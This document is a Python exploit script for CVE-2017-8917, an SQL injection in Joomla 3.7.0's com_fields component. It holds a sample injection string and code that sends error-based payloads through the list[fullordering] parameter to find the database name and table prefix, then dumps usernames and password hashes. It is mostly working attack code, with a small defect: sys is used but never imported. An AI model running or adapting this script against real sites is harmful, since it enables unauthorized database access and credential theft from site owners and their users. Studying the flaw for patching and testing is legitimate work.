"""
CVE: 2017-8917
URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27

Parameter: list[fullordering] (GET)
option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

"""
# Exploit Title: Joomla 3.7.0 - SQLi
# Discovery by: Mateus Lino
# Vendor Homepage: https://www.joomla.org/
# Tested Version: Version: 3.7.0
# CVE: CVE-2017-8917
# Edit by 20100dbg

import requests
import time

CONF = { 'headers': {}, 'table': '', 'column': '' }


def strhex(mystr):
    return '0x' + mystr.encode().hex()


def http(url, payload):
    return requests.get(url + '?' + payload, headers=CONF['headers'])


def extract_line(result):
    data = result.text

    if CONF['sep_row'] in result.text:
        lines = result.text.split(CONF['sep_row'])
        data = lines[1]

    return data
    

def extract_cols(txt):
    
    data = []
    if CONF['sep_col'] in txt:
        data = txt.split(CONF['sep_col'])
    else:
        data = txt

    return data


def build_payload(columns, query=""):
    columns = f",{strhex(CONF['sep_col'])},".join(columns)
    payload = f"(SELECT CONCAT({columns}){query})"    
    return payload


def dump_data(columns, query):
    
    payload_tpl = "option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT((SELECT (ELT(6600=6600,1))),^PAYLOAD^,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
    chunk_size = 50

    payload = build_payload(columns, query)
    
    sqli = f"(SELECT CONCAT({strhex(CONF['sep_row'])},COUNT({payload}),{strhex(CONF['sep_row'])}))"
    sqli = payload_tpl.replace('^PAYLOAD^', sqli)
    res = http(url, sqli)
    nb_lines = int(extract_line(res))

    data_result = []

    for line in range(nb_lines):

        payload = build_payload(columns, query + ' limit ' + str(line) + ',1')
        sqli = f"(SELECT CONCAT({strhex(CONF['sep_row'])},LENGTH({payload}),{strhex(CONF['sep_row'])}))"
        sqli = payload_tpl.replace('^PAYLOAD^', sqli)
        res = http(url, sqli)
        data_length = int(extract_line(res))

        tmp_data = ''

        for chunk_idx in range(1, data_length, chunk_size):
            
            sqli = f"(SELECT CONCAT({strhex(CONF['sep_row'])},MID({payload},{chunk_idx},{chunk_size}),{strhex(CONF['sep_row'])}))"
            sqli = payload_tpl.replace('^PAYLOAD^', sqli)

            res = http(url, sqli)
            tmp_data += extract_line(res)

        data_result.append(extract_cols(tmp_data))

    return data_result


if len(sys.argv) != 2:
    print(f"Usage : python {sys.argv[0]} [URL]")
    exit(1)

url = sys.argv[1].rstrip('/') + '/'

CONF['headers']['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0"
CONF['headers']['Accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"

CONF['sep_col'] = '||'
CONF['sep_row'] = '%%'


data = dump_data(['database()'], '')
print("[+] Current database", data)

"""
data = dump_data(['table_schema'], 'from information_schema.columns group by table_schema')
#data = dump_data(['DISTINCT table_schema'], 'from information_schema.columns')
print("[+] Every databases", data)
"""

data = dump_data(['HEX(MID(TABLE_NAME,1,16))'], 'FROM information_schema.tables WHERE TABLE_NAME LIKE 0x257573657273')

prefix = bytes.fromhex(data[0]).decode()
prefix = prefix[0:prefix.find('_')]
print("[+] Prefix", prefix)

data = dump_data(['username', 'password'], 'from '+ prefix +'_users')
print(data)


